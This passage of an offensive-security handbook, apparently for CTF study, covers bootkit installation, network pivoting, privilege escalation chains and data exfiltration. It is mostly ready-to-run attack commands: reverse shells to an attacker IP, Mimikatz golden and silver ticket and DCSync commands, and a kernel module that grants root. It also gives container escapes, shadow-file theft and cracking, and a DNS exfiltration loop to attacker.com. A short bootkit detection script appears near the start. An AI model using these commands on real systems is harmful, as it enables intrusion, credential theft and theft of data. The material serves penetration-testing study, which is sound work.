cp malicious_shim.efi /boot/efi/EFI/ubuntu/shimx64.efi

# Sign with compromised key if Secure Boot is enabled
sbsign --key compromised.key --cert compromised.crt --output shimx64.efi malicious_shim.efi
```

#### Bootkit Detection Tools

```bash
# GMER (Windows-focused but concept applies)
# For Linux, use custom scripts

# Check boot integrity with AIDE
aide --check

# Verify bootloader checksums
sha256sum /boot/grub/grubx64.efi
sha256sum /boot/efi/EFI/ubuntu/shimx64.efi

# Automated bootkit detection script
cat > detect_bootkit.sh << 'EOF'
#!/bin/bash
echo "Checking MBR..."
dd if=/dev/sda bs=512 count=1 2>/dev/null | md5sum

echo "Checking GRUB..."
md5sum /boot/grub/grub.cfg

echo "Checking EFI entries..."
efibootmgr -v

echo "Checking for suspicious modules..."
lsmod | grep -v "^Module"
EOF

chmod +x detect_bootkit.sh
./detect_bootkit.sh
```

### Key Persistence Considerations for CTF

**Important subtopics for deeper study:**

- **Kernel exploit development** - Understanding how to leverage vulnerabilities for persistent kernel-level access
- **Anti-forensics techniques** - Methods to hide artifacts of persistence mechanisms
- **Cross-platform persistence** - Windows vs Linux differences in persistence strategies
- **Container and VM escape techniques** - Gaining persistence in virtualized environments

---

## Lateral Movement

### Pivot Techniques

Pivoting allows an attacker to use a compromised system as a stepping stone to access otherwise unreachable network segments. The compromised host becomes a relay point for accessing additional targets.

**SSH Pivoting (Dynamic Port Forwarding)**

```bash
# Create SOCKS proxy on local port 1080
ssh -D 1080 user@pivot-host

# Use with proxychains
proxychains nmap -sT -Pn target-ip

# Configure proxychains.conf
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
```

**SSH Local Port Forwarding**

```bash
# Forward local port 8080 to remote service
ssh -L 8080:internal-host:80 user@pivot-host

# Access via localhost
curl http://localhost:8080

# Multiple port forwards
ssh -L 3306:db-server:3306 -L 445:file-server:445 user@pivot-host
```

**SSH Remote Port Forwarding**

```bash
# Expose local service through remote host
ssh -R 8080:localhost:80 user@pivot-host

# Reverse shell listener forwarding
ssh -R 4444:localhost:4444 user@pivot-host
```

**Metasploit Pivoting with Autoroute**

```bash
# Add route through session
meterpreter > run autoroute -s 172.16.0.0/24
meterpreter > run autoroute -p  # Print routing table

# Alternative method
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 1
msf6 > set SUBNET 172.16.0.0
msf6 > run

# Background session and scan through pivot
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.0.0/24
msf6 > set PORTS 22,80,443,445
msf6 > run
```

**Chisel for HTTP/SOCKS Tunneling**

```bash
# Attacker machine (server mode)
./chisel server -p 8000 --reverse

# Compromised host (client mode - SOCKS proxy)
./chisel client attacker-ip:8000 R:socks

# Configure proxychains to use 127.0.0.1:1080

# Port forwarding specific service
./chisel client attacker-ip:8000 R:3306:internal-db:3306
```

**Ligolo-ng for Advanced Pivoting**

```bash
# Attacker side (proxy)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Target side (agent)
./agent -connect attacker-ip:11601 -ignore-cert

# In proxy interface
>> session  # Select agent session
>> ifconfig  # View target networks
>> start  # Start tunnel

# Add routes on attacker
sudo ip route add 172.16.0.0/24 dev ligolo
```

### Proxy Tunneling

**SOCKS Proxy with SSH**

```bash
# Dynamic application-level port forwarding
ssh -N -D 127.0.0.1:1080 user@pivot-host

# Verify SOCKS proxy
netstat -tulpn | grep 1080

# Use with tools
proxychains firefox
proxychains msfconsole
proxychains crackmapexec smb 172.16.0.0/24
```

**Proxychains Configuration**

```bash
# Edit /etc/proxychains4.conf
strict_chain  # or dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4 127.0.0.1 1080
# socks5 127.0.0.1 1080  # For SOCKS5

# Test configuration
proxychains curl http://internal-host
```

**HTTP Tunneling with reGeorg**

```bash
# Upload tunnel script to web server
# reGeorg supports: tunnel.aspx, tunnel.jsp, tunnel.php, tunnel.py

# Start reGeorgSocksProxy
python reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.php

# Configure proxychains to use 127.0.0.1:8080
```

**DNS Tunneling with Iodine**

[Unverified] - DNS tunneling effectiveness depends on network configuration and DNS server permissions.

```bash
# Server setup (requires domain control)
sudo iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# Client connection
sudo iodine -f -P password tunnel.yourdomain.com

# New interface created (dns0)
ifconfig dns0
ssh user@10.0.0.1
```

**ICMP Tunneling with ptunnel-ng**

```bash
# Server side (pivot host)
sudo ptunnel-ng -r10.10.10.10 -R22

# Client side (attacker)
sudo ptunnel-ng -p pivot-ip -l2222 -r internal-ssh-server -R22

# Connect through tunnel
ssh -p 2222 user@localhost
```

### VPN Access Establishment

**OpenVPN Pivot Setup**

```bash
# Generate certificates on attacker machine
cd /etc/openvpn/easy-rsa
./easyrsa init-pki
./easyrsa build-ca
./easyrsa gen-req pivot-client
./easyrsa sign-req client pivot-client

# Server configuration (attacker)
sudo openvpn --config server.conf

# Transfer client.ovpn to pivot host
# Connect from pivot host
sudo openvpn --config client.ovpn
```

**WireGuard for Fast Pivoting**

```bash
# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey

# Server config (/etc/wireguard/wg0.conf)
[Interface]
PrivateKey = <server-private-key>
Address = 10.8.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <client-public-key>
AllowedIPs = 10.8.0.2/32

# Start server
sudo wg-quick up wg0

# Client config on pivot
[Interface]
PrivateKey = <client-private-key>
Address = 10.8.0.2/24

[Peer]
PublicKey = <server-public-key>
Endpoint = attacker-ip:51820
AllowedIPs = 0.0.0.0/0
```

**sshuttle for VPN-like Access**

```bash
# Route entire subnet through SSH
sshuttle -r user@pivot-host 172.16.0.0/24

# Include DNS forwarding
sshuttle --dns -r user@pivot-host 172.16.0.0/24

# Exclude specific ranges
sshuttle -r user@pivot-host 172.16.0.0/24 -x 172.16.0.5

# Verbose mode for debugging
sshuttle -vvr user@pivot-host 172.16.0.0/24
```

### Trust Relationship Abuse

**SMB/NetBIOS Trust Exploitation**

```bash
# Enumerate domain trusts
crackmapexec smb dc-ip -u username -p password --trusts

# PowerShell trust enumeration
Get-ADTrust -Filter *
Get-DomainTrust  # PowerView

# Map trust relationships
nltest /domain_trusts
nltest /trusted_domains
```

**Kerberos Trust Ticket Attacks**

```bash
# Request inter-realm TGT
# Requires compromised domain credentials
Invoke-Mimikatz -Command '"kerberos::golden /domain:child.domain.com /sid:S-1-5-21-xxx /sids:S-1-5-21-parent-519 /rc4:hash /user:Administrator /service:krbtgt /target:parent.domain.com /ticket:trust.kirbi"'

# Convert and use ticket
mimikatz # kerberos::ptt trust.kirbi

# Linux alternative with impacket
ticketer.py -nthash krbtgt-hash -domain-sid domain-sid -domain domain.com -extra-sid parent-sid Administrator
export KRB5CCNAME=Administrator.ccache
```

**Cross-Forest Trust Exploitation**

```bash
# Enumerate foreign security principals
Get-DomainObject -Domain target.com -LDAPFilter '(objectClass=foreignSecurityPrincipal)'

# Identify cross-forest permissions
Find-ForeignGroup -Domain target.com
Find-ForeignUser -Domain target.com

# Abuse trust for access
Invoke-Command -ComputerName dc.target.com -Credential $cred -ScriptBlock {whoami}
```

**SQL Server Link Trust Abuse**

```bash
# Enumerate linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;

# Execute through link
EXEC ('SELECT SYSTEM_USER') AT [linked-server];

# Chain linked servers
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [nested-link]') AT [linked-server];

# Enable xp_cmdshell through chain
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [target]') AT [link];
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [target]') AT [link];
```

### Domain Trust Exploitation

**SID History Injection**

[Inference] - Requires Domain Admin or equivalent privileges on the source domain.

```bash
# Add SID history using Mimikatz
mimikatz # sid::add /sam:username /new:target-domain-sid-512

# PowerShell method (requires DA)
Set-ADUser username -Add @{'sidHistory'='S-1-5-21-target-domain-512'}

# Verify SID history
Get-ADUser username -Properties sidHistory
```

**Golden Ticket Across Trusts**

```bash
# Dump krbtgt hash from child domain
lsadump::dcsync /domain:child.domain.com /user:krbtgt

# Create inter-realm TGT with Enterprise Admin SID
kerberos::golden /domain:child.domain.com /sid:S-1-5-21-child-sid /sids:S-1-5-21-parent-sid-519 /krbtgt:hash /user:Administrator /ticket:golden.kirbi

# Inject ticket
kerberos::ptt golden.kirbi

# Access parent domain resources
dir \\parent-dc\c$
```

**Trust Key Extraction**

```bash
# Dump trust keys
lsadump::trust /patch

# Use trust key for ticket
kerberos::golden /domain:child.com /sid:S-1-5-21-child /rc4:trust-key /user:Administrator /service:krbtgt /target:parent.com /ticket:trust-tkt.kirbi

# Linux with impacket
secretsdump.py domain/user@dc-ip -just-dc-user 'CHILD$'
```

**Unconstrainted Delegation Abuse**

```bash
# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# PowerView
Get-DomainComputer -Unconstrained

# Compromise unconstrained delegation host and monitor
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Wait for DA or high-value account to authenticate
# Extract and reuse TGT
```

### Network Bridge Creation

**Linux Network Bridge**

```bash
# Install bridge utilities
apt-get install bridge-utils

# Create bridge interface
brctl addbr br0
brctl addif br0 eth0
brctl addif br0 eth1

# Assign IP address
ip addr add 192.168.1.1/24 dev br0
ip link set br0 up

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Verify bridge
brctl show
```

**IPTables for Network Bridging**

```bash
# Enable forwarding between interfaces
iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT

# NAT for outbound traffic
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Port forwarding to internal host
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 172.16.0.10:80
iptables -A FORWARD -p tcp -d 172.16.0.10 --dport 80 -j ACCEPT

# Save rules
iptables-save > /etc/iptables/rules.v4
```

**Windows Network Bridge**

```powershell
# PowerShell bridge creation (requires admin)
New-NetIPAddress -InterfaceAlias "Ethernet 2" -IPAddress 192.168.100.1 -PrefixLength 24

# Enable routing
Set-NetIPInterface -InterfaceAlias "Ethernet" -Forwarding Enabled
Set-NetIPInterface -InterfaceAlias "Ethernet 2" -Forwarding Enabled

# Add route
New-NetRoute -DestinationPrefix "172.16.0.0/24" -InterfaceAlias "Ethernet 2" -NextHop 192.168.100.254
```

**Socat for Port Bridging**

```bash
# TCP relay between networks
socat TCP-LISTEN:8080,fork TCP:internal-host:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:internal-dns:53

# Bidirectional relay
socat TCP-LISTEN:3389,reuseaddr,fork TCP:172.16.0.10:3389

# TLS/SSL wrapping
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:internal-web:80
```

**Metasploit Portfwd Module**

```bash
# Forward port through meterpreter
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.0.10

# List active forwards
meterpreter > portfwd list

# Delete forward
meterpreter > portfwd delete -l 3389

# Reverse port forward (expose attacker service)
meterpreter > portfwd add -R -l 80 -p 8080 -L attacker-ip
```

**Double Pivoting Scenario**

```bash
# Scenario: Attacker -> Pivot1 -> Pivot2 -> Target

# Step 1: SSH to Pivot1 with SOCKS proxy
ssh -D 1080 user@pivot1-ip

# Step 2: From Pivot1, create second tunnel to Pivot2
ssh -D 1081 user@pivot2-ip

# Step 3: Chain proxies in proxychains.conf
[ProxyList]
socks4 127.0.0.1 1080
socks4 127.0.0.1 1081

# Alternative: Use Metasploit route chaining
msf6 > route add 172.16.0.0/24 session_1
msf6 > route add 10.10.10.0/24 session_2
msf6 > route print
```

---

**Key Considerations for Lateral Movement:**

- Always document network topology as you discover new segments
- Use OPSEC-conscious techniques; excessive pivoting creates network noise
- Prefer encrypted tunnels (SSH, VPN) over cleartext protocols when possible
- Test connectivity incrementally: ping → port scan → service enumeration → exploitation
- Monitor for endpoint detection and network monitoring tools that may detect pivoting activity
- Clean up forwarding rules and tunnels after use to avoid detection during incident response

---

## Privilege Escalation Chains

### Combining Multiple Vulnerabilities

Privilege escalation chains exploit sequences of security weaknesses where individual vulnerabilities may be insufficient alone but become powerful when combined. The methodology requires systematic enumeration to identify linkable vulnerabilities.

**Chain Discovery Methodology:**

```bash
# Comprehensive enumeration for chain identification
./linpeas.sh -a > full_enum.txt
./pspy64 -pf -i 1000  # Monitor processes for timing opportunities
```

**Common Chain Patterns:**

1. **Write + Execute Chains**: Writable configuration file → service restart → code execution
2. **Read + Reuse Chains**: Credential disclosure → lateral movement → privileged access
3. **Misconfiguration + Exploit Chains**: Weak permissions → binary replacement → privileged execution

**Example Chain - Writable Service Binary:**

```bash
# 1. Identify writable service binary
find / -writable -type f 2>/dev/null | grep -E 'bin|sbin'

# 2. Check service permissions
ls -la /usr/local/bin/vulnerable-service
systemctl list-units --type=service --all | grep vulnerable

# 3. Replace binary with reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o service
chmod +x service
cp service /usr/local/bin/vulnerable-service

# 4. Trigger service restart (may require waiting for cron or system event)
systemctl restart vulnerable-service
# OR find automated restart mechanism
grep -r "vulnerable-service" /etc/cron* /var/spool/cron
```

**Configuration File Overwrite Chain:**

```bash
# 1. Find writable configs executed by root
find /etc -writable -type f 2>/dev/null
getcap -r / 2>/dev/null  # Check for capability-based execution

# 2. Identify execution context
systemctl show service-name | grep ExecStart
ps aux | grep service-name

# 3. Inject malicious configuration
echo 'root:password:0:0:root:/root:/bin/bash' >> /etc/passwd
# OR for service configs
echo 'ExecStartPre=/tmp/privesc.sh' >> /etc/systemd/system/service.service
```

### Chaining Kernel Exploits

Kernel exploit chains combine information disclosure vulnerabilities with memory corruption exploits to achieve reliable privilege escalation. Most modern chains follow: leak → bypass → exploit pattern.

**Kernel Version Enumeration:**

```bash
uname -a
cat /proc/version
cat /etc/os-release
searchsploit "Linux Kernel $(uname -r | cut -d'-' -f1)"
```

**Dirty Pipe + SUID Chain (CVE-2022-0847):**

The Dirty Pipe vulnerability allows overwriting read-only files. Chain this with SUID binaries for privilege escalation.

```bash
# 1. Compile exploit
gcc -o dirtypipe dirtypipe.c

# 2. Target /etc/passwd or SUID binary
./dirtypipe /etc/passwd 1 'root::0:0:root:/root:/bin/bash'
su root  # No password required

# Alternative: Overwrite SUID binary
./dirtypipe /usr/bin/sudo 1 <shellcode_offset>
```

**Information Leak + Use-After-Free Chain:**

```bash
# 1. Leak kernel addresses (KASLR bypass)
dmesg | grep "Kernel physical"  # Requires unprivileged dmesg access
cat /proc/kallsyms | grep sys_call_table

# 2. Use leaked addresses in UAF exploit
gcc -o exploit exploit.c -DKASLR_OFFSET=0x<leaked_offset>
./exploit
```

**eBPF Verification Bypass Chain (CVE-2021-3490):**

[Inference: Based on documented eBPF vulnerability patterns, not a guaranteed exploitation method]

```bash
# 1. Check eBPF availability
ls -la /sys/kernel/debug/tracing

# 2. Exploit verification logic
# This requires custom exploit code targeting specific kernel versions
./ebpf_exploit --leak-addr --spray-heap --trigger
```

### Windows Token Chaining

Windows access tokens contain privilege information. Token manipulation chains involve stealing, duplicating, or modifying tokens from higher-privileged processes.

**Token Enumeration:**

```powershell
# Check current privileges
whoami /priv
whoami /groups

# Identify processes with valuable tokens
ps | Where-Object {$_.ProcessName -in @("lsass","winlogon","services")}

# PowerShell token checking
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups
```

**SeImpersonate/SeAssignPrimaryToken Chain (Potato Attacks):**

```powershell
# 1. Check for dangerous privileges
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"

# 2. Execute PrintSpoofer (works on Windows 10/11, Server 2019+)
PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "nc.exe 10.10.14.5 4444 -e cmd.exe"

# 3. Alternative: GodPotato for newer systems
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe 10.10.14.5 4444 -e cmd.exe"
```

**Token Theft from SYSTEM Process:**

```powershell
# Using Incognito (Metasploit module)
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"

# Manual token duplication via PowerShell
$proc = Get-Process -Name winlogon
[YourTokenManipulation]::DuplicateToken($proc.Handle)
```

**Parent Process Token Inheritance Chain:**

```powershell
# 1. Identify service running as SYSTEM with weak permissions
Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Select Name,PathName,StartMode

# 2. Modify service binary path to spawn child with inherited token
sc.exe config vulnerable-service binPath= "C:\windows\temp\shell.exe"
sc.exe stop vulnerable-service
sc.exe start vulnerable-service

# 3. Child process inherits SYSTEM token
```

**Named Pipe Impersonation Chain:**

```powershell
# 1. Create named pipe server
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("testpipe", [System.IO.Pipes.PipeDirection]::InOut)

# 2. Trigger SYSTEM process connection (via DCOM, Print Spooler, etc.)
# [Inference: Specific trigger depends on available services]

# 3. Impersonate connecting client token
$pipe.WaitForConnection()
[System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
# Token impersonation occurs at native API level
```

### Linux Capability Chaining

Linux capabilities split root privileges into discrete units. Chaining exploits capabilities on binaries or processes to escalate privileges without full SUID exploitation.

**Capability Enumeration:**

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Check current process capabilities
cat /proc/self/status | grep Cap
capsh --decode=<hex_value>

# Common dangerous capabilities:
# CAP_SETUID, CAP_SETGID, CAP_DAC_OVERRIDE, CAP_DAC_READ_SEARCH
# CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE
```

**CAP_SETUID Exploitation Chain:**

```bash
# Python with CAP_SETUID
getcap /usr/bin/python3.9
# /usr/bin/python3.9 = cap_setuid+ep

python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**CAP_DAC_READ_SEARCH Chain (Read Any File):**

```bash
# Tar with CAP_DAC_READ_SEARCH
tar cvf shadow.tar /etc/shadow 2>/dev/null
tar -xvf shadow.tar
cat etc/shadow

# Chain with hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt etc/shadow
hashcat -m 1800 etc/shadow /usr/share/wordlists/rockyou.txt
```

**CAP_SYS_PTRACE + CAP_DAC_READ_SEARCH Chain:**

```bash
# 1. Find process running as root
ps aux | grep root

# 2. Inject shellcode using ptrace
gdb -p <root_pid>
(gdb) call (void*)system("chmod u+s /bin/bash")
(gdb) detach
(gdb) quit

# 3. Execute SUID shell
/bin/bash -p
```

**CAP_SYS_MODULE Chain (Kernel Module Injection):**

```bash
# 1. Check capability
getcap /usr/bin/kmod
# /usr/bin/kmod = cap_sys_module+ep

# 2. Create malicious kernel module
cat << 'EOF' > rootkit.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>

static int __init rootkit_init(void) {
    struct cred *new_cred = prepare_creds();
    if (new_cred) {
        new_cred->uid.val = new_cred->gid.val = 0;
        new_cred->euid.val = new_cred->egid.val = 0;
        commit_creds(new_cred);
    }
    return 0;
}

static void __exit rootkit_exit(void) {}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF

# 3. Compile and load
echo "obj-m += rootkit.o" > Makefile
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod rootkit.ko
```

**CAP_SYS_ADMIN Container Escape Chain:**

```bash
# 1. Check if inside container with CAP_SYS_ADMIN
capsh --print | grep sys_admin
cat /proc/1/cgroup | grep docker

# 2. Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 3. Access host via chroot
chroot /mnt/host /bin/bash

# Alternative: cgroup release_agent escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent
```

### Domain-to-Local Exploitation

Domain-to-local chains leverage Active Directory privileges or credentials to escalate on local machines. This involves converting domain access into local administrative control.

**Cached Credential Extraction:**

```powershell
# 1. Extract cached domain credentials
mimikatz.exe
mimikatz# sekurlsa::logonpasswords
mimikatz# sekurlsa::tickets /export

# 2. Use domain credentials for local admin access
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123' --local-auth
evil-winrm -i target.local -u administrator -p 'Password123'
```

**Domain Credential → Local Admin Chain:**

```bash
# 1. Extract NTLM hashes from domain user
secretsdump.py domain/user:password@dc.target.local

# 2. Check local admin access across network
crackmapexec smb targets.txt -u administrator -H <ntlm_hash> --local-auth

# 3. Execute commands as local admin
psexec.py administrator@target.local -hashes :<ntlm_hash>
wmiexec.py administrator@target.local -hashes :<ntlm_hash>
```

**LAPS Password Extraction Chain:**

```powershell
# 1. Check LAPS read permissions (requires domain user)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_."ms-Mcs-AdmPwd" -ne $null} | Select-Object Name,ms-Mcs-AdmPwd

# 2. Use LAPS password for local admin
evil-winrm -i target-pc -u administrator -p '<LAPS_password>'

# Alternative via PowerView
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "ms-Mcs-AdmPwd"}
```

**GPO Abuse for Local Privilege Escalation:**

```powershell
# 1. Identify modifiable GPOs (requires domain user with write access)
Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# 2. Add local administrator via GPO (SharpGPOAbuse)
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv --GPOName "Vulnerable GPO"

# 3. Force GPO update on target
gpupdate /force
Invoke-GPUpdate -Computer target-pc -Force -RandomDelayInMinutes 0

# 4. Authenticate as local admin
evil-winrm -i target-pc -u lowpriv -p 'password'
```

**Domain Trust Exploitation Chain:**

```powershell
# 1. Enumerate trust relationships
Get-ADTrust -Filter *
nltest /domain_trusts

# 2. Obtain trust key or TGT
mimikatz# lsadump::trust /patch
mimikatz# kerberos::golden /domain:child.domain.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /rc4:<trust_key> /user:Administrator /service:krbtgt /target:parent.domain.local /ticket:trust.kirbi

# 3. Use cross-domain ticket for local access
mimikatz# kerberos::ptt trust.kirbi
dir \\dc.parent.domain.local\c$
```

**Silver Ticket → Local Admin Chain:**

```powershell
# 1. Extract service account hash (e.g., machine account)
mimikatz# sekurlsa::logonpasswords

# 2. Create silver ticket for CIFS service
mimikatz# kerberos::golden /domain:target.local /sid:S-1-5-21-... /target:server.target.local /service:cifs /rc4:<machine_hash> /user:Administrator /ptt

# 3. Access as local admin via SMB
dir \\server.target.local\c$
psexec.exe \\server.target.local cmd.exe
```

---

### Important Related Topics

For complete chain exploitation capabilities, consider studying:

- **Post-Exploitation Persistence Mechanisms** - maintaining access after initial escalation
- **Active Directory Attack Paths** - BloodHound analysis for optimal chain identification
- **Container Escape Techniques** - modern environment privilege escalation
- **Exploit Mitigation Bypass** - ASLR, DEP, and CFG circumvention for reliable chains

---

## Data Exfiltration

### Compression Techniques (tar, zip, rar)

#### TAR Archives (Linux/Unix)

**Basic tar compression:**

```bash
# Create gzip compressed archive
tar -czf data.tar.gz /path/to/sensitive/data/
tar -czf backup.tar.gz /etc/passwd /etc/shadow /home/user/.ssh/

# Create bzip2 compressed archive (higher compression ratio)
tar -cjf data.tar.bz2 /var/www/html/

# Create xz compressed archive (highest compression, slower)
tar -cJf data.tar.xz /opt/database/

# Exclude specific files/patterns
tar -czf data.tar.gz --exclude='*.log' --exclude='cache/*' /var/www/

# Preserve permissions and ownership
tar -czpf backup.tar.gz /root/
```

**Compression ratio comparison [Inference: based on typical file types]:**

```bash
# Test compression efficiency
tar -czf data.tar.gz data/     # gzip: fastest, moderate compression
tar -cjf data.tar.bz2 data/    # bzip2: medium speed, better compression
tar -cJf data.tar.xz data/     # xz: slowest, best compression

# Check sizes
ls -lh data.tar.*
```

**Split tar archives for size limits:**

```bash
# Create and split in one command
tar -czf - /large/directory | split -b 50M - archive.tar.gz.part

# Reconstruct on attacker machine
cat archive.tar.gz.part* | tar -xzf -
```

#### ZIP Archives

**Standard zip compression:**

```bash
# Create password-protected zip
zip -r -e -P 'SecretP@ss123' data.zip /path/to/data/

# Maximum compression level
zip -9 -r data.zip /sensitive/files/

# Encrypt with AES-256 (using 7z)
7z a -tzip -p'SecretP@ss123' -mem=AES256 data.zip /path/to/data/

# Recursive with hidden files
zip -r data.zip /home/user/ -i ".*"
```

**Windows native compression:**

```powershell
# PowerShell compression
Compress-Archive -Path C:\Users\Administrator\Documents -DestinationPath C:\Temp\data.zip -CompressionLevel Optimal

# Password protection (requires additional module)
Compress-Archive -Path C:\Sensitive\ -DestinationPath C:\Temp\backup.zip
```

**Split zip archives:**

```bash
# Create split archives (100MB parts)
zip -s 100m -r data.zip /large/dataset/

# Windows split
7z a -v100m data.7z C:\Data\
```

#### RAR Archives

**RAR compression (requires rar/unrar):**

```bash
# Create password-protected RAR
rar a -p'SecretP@ss' -m5 data.rar /path/to/data/

# Split RAR archive (50MB volumes)
rar a -v50m -p'SecretP@ss' data.rar /large/files/

# Lock archive (prevent modifications)
rar a -p'SecretP@ss' -k data.rar /sensitive/

# Maximum compression with recovery record
rar a -m5 -rr10p -p'SecretP@ss' data.rar /critical/data/
```

**Windows RAR usage:**

```cmd
"C:\Program Files\WinRAR\Rar.exe" a -p'SecretP@ss' -m5 C:\Temp\data.rar C:\Sensitive\
"C:\Program Files\WinRAR\Rar.exe" a -v100m -p'SecretP@ss' C:\Temp\split.rar C:\LargeData\
```

#### Compression Optimization for Exfiltration

**File type considerations:**

```bash
# Already compressed formats (minimal benefit)
# Images: .jpg, .png, .gif
# Video: .mp4, .avi, .mkv
# Archives: .zip, .rar, .7z
# Skip compression for these

# Highly compressible formats
# Text: .txt, .log, .csv, .json, .xml
# Code: .py, .php, .js, .html
# Documents: .doc, .pdf, .odt
# Databases: .sql, .db

# Selective compression
find /var/log -name "*.log" -type f | tar -czf logs.tar.gz -T -
```

### Encryption Before Exfiltration

#### OpenSSL Encryption

**AES encryption:**

```bash
# Encrypt file with AES-256-CBC
openssl enc -aes-256-cbc -salt -in sensitive.tar.gz -out sensitive.tar.gz.enc -k 'StrongPassword123!'

# Encrypt with key file
openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.tar.gz.enc -pass file:/tmp/.key

# Base64 encode encrypted output (for text-based exfil)
openssl enc -aes-256-cbc -salt -in data.tar.gz -a -out data.tar.gz.enc -k 'Password123'

# Decrypt on attacker machine
openssl enc -d -aes-256-cbc -in data.tar.gz.enc -out data.tar.gz -k 'StrongPassword123!'
```

**Public key encryption (asymmetric):**

```bash
# Generate RSA key pair (on attacker machine)
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem

# Transfer public key to target
# Encrypt data with public key
openssl rsautl -encrypt -pubin -inkey public.pem -in data.txt -out data.enc

# For large files, hybrid approach
# Generate random symmetric key
openssl rand -base64 32 > session.key

# Encrypt data with symmetric key
openssl enc -aes-256-cbc -salt -in large_data.tar.gz -out data.enc -pass file:session.key

# Encrypt symmetric key with public key
openssl rsautl -encrypt -pubin -inkey public.pem -in session.key -out session.key.enc

# Decrypt on attacker machine
openssl rsautl -decrypt -inkey private.pem -in session.key.enc -out session.key
openssl enc -d -aes-256-cbc -in data.enc -out large_data.tar.gz -pass file:session.key
```

#### GPG Encryption

**Symmetric encryption:**

```bash
# Encrypt with passphrase
gpg --symmetric --cipher-algo AES256 sensitive.tar.gz

# Batch mode (no interactive prompts)
echo "StrongPassphrase" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 data.tar.gz

# Decrypt
gpg --decrypt data.tar.gz.gpg > data.tar.gz
```

**Asymmetric encryption:**

```bash
# Import attacker's public key
gpg --import attacker_public.key

# Encrypt for recipient
gpg --recipient attacker@email.com --encrypt sensitive.tar.gz

# Decrypt on attacker machine
gpg --decrypt sensitive.tar.gz.gpg > sensitive.tar.gz
```

#### Windows Encryption

**Built-in Windows encryption:**

```powershell
# Using Cipher.exe (EFS)
cipher /E /S:C:\Sensitive\

# PowerShell AES encryption
$Key = [byte[]]@(1..32)
$SecureKey = ConvertTo-SecureString -String "Password123!" -AsPlainText -Force
$EncryptedData = Get-Content C:\data.txt | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -Key $Key
$EncryptedData | Out-File C:\data.enc

# Using .NET for stronger encryption
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.KeySize = 256
```

**Third-party tools:**

```cmd
# 7-Zip with AES-256
"C:\Program Files\7-Zip\7z.exe" a -p'SecretPassword' -mhe=on -t7z data.7z C:\Sensitive\

# GPG4Win
gpg --symmetric --cipher-algo AES256 data.zip
```

### Slow/Stealth Exfiltration (DNS, ICMP, HTTP)

#### DNS Exfiltration

**Basic DNS tunneling:**

```bash
# Split data into DNS queries
cat sensitive.txt | xxd -p | tr -d '\n' | fold -w32 | while read line; do
    dig $line.attacker.com @ns.attacker.com
done

# Using dnscat2 (requires dnscat2 server on attacker)
# On attacker machine
ruby dnscat2.rb attacker.com

# On target
./dnscat2 attacker.com
```

**Manual DNS exfiltration script:**

```bash
#!/bin/bash
# Encode and exfiltrate via DNS
FILE="$1"
DOMAIN="attacker.com"
DNS_SERVER="10.10.14.5"

# Base64 encode and split
